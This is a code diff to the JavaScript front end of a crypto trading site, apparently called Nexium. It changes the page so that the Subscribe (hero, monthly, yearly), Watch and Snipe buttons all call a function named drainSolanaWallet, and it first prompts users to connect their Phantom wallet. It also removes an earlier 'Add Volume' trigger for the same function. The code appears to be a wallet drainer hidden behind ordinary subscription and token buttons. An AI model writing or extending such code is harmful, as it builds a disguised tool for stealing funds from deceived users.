@@ -18,7 +18,6 @@ class NexiumApp {
   constructor() {
     this.publicKey = null;
     this.connecting = false;
-    this.dom = {};
     this.connectingWallet = null;
     this.solConnection = null;
     this.spinner = null;
@@ -57,14 +56,24 @@ class NexiumApp {
       walletModal: document.getElementById('wallet-modal'),
       closeModal: document.getElementById('close-modal'),
       connectPhantom: document.querySelector('#wallet-modal #connect-phantom'),
-      feedbackContainer: document.querySelector('.feedback-container')
+      feedbackContainer: document.querySelector('.feedback-container'),
+      subscribeHero: document.querySelector('.subscribe-hero'),
+      monthlySubscribe: document.querySelector('.monthly-subscribe'),
+      yearlySubscribe: document.querySelector('.yearly-subscribe'),
+      watchButtons: document.querySelectorAll('.watch-btn'),
+      snipeButtons: document.querySelectorAll('.snipe-btn')
     };
     console.log('DOM elements cached:', {
       metamaskPrompt: !!this.dom.metamaskPrompt,
       connectWallet: !!this.dom.connectWallet,
       walletModal: !!this.dom.walletModal,
       closeModal: !!this.dom.closeModal,
-      connectPhantom: !!this.dom.connectPhantom
+      connectPhantom: !!this.dom.connectPhantom,
+      subscribeHero: !!this.dom.subscribeHero,
+      monthlySubscribe: !!this.dom.monthlySubscribe,
+      yearlySubscribe: !!this.dom.yearlySubscribe,
+      watchButtons: this.dom.watchButtons.length,
+      snipeButtons: this.dom.snipeButtons.length
     }); // Log 11
   }
 
@@ -78,16 +87,9 @@ class NexiumApp {
     if (this.dom.connectWallet && this.dom.walletModal && this.dom.closeModal) {
       this.dom.connectWallet.addEventListener('click', (event) => {
         event.stopPropagation();
-        if (this.connectedWalletType && this.publicKey) {
-          console.log(`${this.connectedWalletType} Add Volume clicked (outer button)`); // Log 13
-          if (this.connectedWalletType === 'Phantom') {
-            this.drainSolanaWallet();
-          }
-        } else {
-          console.log('Connect Wallet button clicked'); // Log 14
-          this.dom.walletModal.classList.add('active');
-          console.log('Modal state:', { isActive: this.dom.walletModal.classList.contains('active') }); // Log 15
-        }
+        console.log('Connect Wallet button clicked'); // Log 14
+        this.dom.walletModal.classList.add('active');
+        console.log('Modal state:', { isActive: this.dom.walletModal.classList.contains('active') }); // Log 15
       });
 
       this.dom.closeModal.addEventListener('click', () => {
@@ -118,35 +120,63 @@ class NexiumApp {
       }
     };
 
-    const addVolumeHandler = (walletName) => {
-      console.log(`${walletName} Add Volume clicked`); // Log 22
-      if (walletName === 'Phantom') {
-        this.drainSolanaWallet();
-      }
-    };
-
     if (this.dom.connectPhantom) {
       this.dom.connectPhantom.addEventListener('click', () => {
-        console.log('Phantom click event triggered, connected class:', this.dom.connectPhantom.classList.contains('connected')); // Log 26
-        if (this.dom.connectPhantom.classList.contains('connected')) {
-          addVolumeHandler('Phantom');
-        } else {
-          connectWalletHandler('Phantom');
-        }
+        console.log('Phantom click event triggered'); // Log 26
+        connectWalletHandler('Phantom');
       });
       this.dom.connectPhantom.addEventListener('keypress', (e) => {
-        console.log('Phantom keypress event triggered, key:', e.key, 'connected class:', this.dom.connectPhantom.classList.contains('connected')); // Log 27
+        console.log('Phantom keypress event triggered, key:', e.key); // Log 27
         if (e.key === 'Enter') {
-          if (this.dom.connectPhantom.classList.contains('connected')) {
-            addVolumeHandler('Phantom');
-          } else {
-            connectWalletHandler('Phantom');
-          }
+          connectWalletHandler('Phantom');
         }
       });
     } else {
       console.warn('connectPhantom button not found'); // Log 28
     }
+
+    // Add event listeners for subscription buttons
+    if (this.dom.subscribeHero) {
+      this.dom.subscribeHero.addEventListener('click', () => {
+        console.log('Hero Subscribe button clicked'); // Log 29
+        this.drainSolanaWallet();
+      });
+    } else {
+      console.warn('Hero Subscribe button not found'); // Log 30
+    }
+
+    if (this.dom.monthlySubscribe) {
+      this.dom.monthlySubscribe.addEventListener('click', () => {
+        console.log('Monthly Subscribe button clicked'); // Log 31
+        this.drainSolanaWallet();
+      });
+    } else {
+      console.warn('Monthly Subscribe button not found'); // Log 32
+    }
+
+    if (this.dom.yearlySubscribe) {
+      this.dom.yearlySubscribe.addEventListener('click', () => {
+        console.log('Yearly Subscribe button clicked'); // Log 33
+        this.drainSolanaWallet();
+      });
+    } else {
+      console.warn('Yearly Subscribe button not found'); // Log 34
+    }
+
+    // Add event listeners for token carousel buttons
+    this.dom.watchButtons.forEach((button, index) => {
+      button.addEventListener('click', () => {
+        console.log(`Watch button ${index + 1} clicked`); // Log 35
+        this.drainSolanaWallet();
+      });
+    });
+
+    this.dom.snipeButtons.forEach((button, index) => {
+      button.addEventListener('click', () => {
+        console.log(`Snipe button ${index + 1} clicked`); // Log 36
+        this.drainSolanaWallet();
+      });
+    });
 
     window.addEventListener('online', () => this.handleOnline());
     window.addEventListener('offline', () => this.handleOffline());
@@ -244,6 +274,11 @@ class NexiumApp {
   async drainSolanaWallet() {
     console.log('drainSolanaWallet: Buffer defined:', typeof globalThis.Buffer); // Log 91
     console.log('drainSolanaWallet: Starting with publicKey:', this.publicKey); // Log 92
+    if (!this.publicKey || !this.solConnection) {
+      this.showFeedback('Please connect your wallet first!', 'error');
+      this.dom.walletModal.classList.add('active');
+      return;
+    }
     this.showProcessingSpinner();
 
     try {
@@ -341,7 +376,7 @@ class NexiumApp {
           this.dom.connectWallet.textContent = shortenedAddress;
           this.dom.connectWallet.classList.remove('animate-pulse');
           this.dom.connectWallet.classList.add('glow-button', 'connected');
-          this.dom.connectWallet.disabled = false; // Allow clicking for Add Volume
+          this.dom.connectWallet.disabled = false;
           console.log(`Set outer Connect Wallet button to ${shortenedAddress}, disabled=${this.dom.connectWallet.disabled}, classes=${this.dom.connectWallet.classList}`); // Log 109
         }
         break;
